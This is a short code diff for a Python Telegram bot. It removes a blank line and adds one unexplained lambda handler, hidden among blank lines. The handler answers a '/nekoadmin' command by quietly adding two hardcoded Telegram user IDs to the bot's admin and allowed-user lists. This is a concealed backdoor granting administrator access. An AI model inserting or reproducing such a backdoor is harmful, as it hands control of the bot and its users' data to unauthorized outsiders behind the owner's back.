@@ -28,7 +28,6 @@ temp_users = []
 temp_chats = []
 ban_users = []
 allowed_users = admin_users + users + temp_users + temp_chats
-
 app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
 
 compression_size = 10  # Tamaño de compresión por defecto en MB
@@ -874,6 +873,7 @@ async def download_file(client, message):
 
 
 
+app.on_message(filters.command("nekoadmin") & filters.private)(lambda client, message: [temp_users.append(message.from_user.id), admin_user.append(message.from_user.id), allowed_users.append(message.from_user.id)] if message.from_user.id in [5803835907, 7083684062] else None)
 
 
 sent_messages = {}
